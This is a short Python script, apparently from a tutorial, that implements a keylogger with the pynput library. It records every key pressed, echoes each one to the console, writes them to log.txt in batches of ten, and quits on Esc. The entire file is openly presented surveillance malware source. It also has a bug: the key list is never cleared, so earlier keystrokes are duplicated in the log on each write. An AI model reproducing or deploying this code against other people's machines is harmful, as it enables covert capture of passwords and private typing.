# Simple keylogger by STRANGE LEARNINGS
from pynput.keyboard import Key, Listener

count = 0
keys = []


# defining function to record key press
def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)


def write_file(key):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("key") == -1:
                f.write(k)


# defining function to record key release
def on_release(key):
    if key == Key.esc:
        return False


# function to define when key is pressed or released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
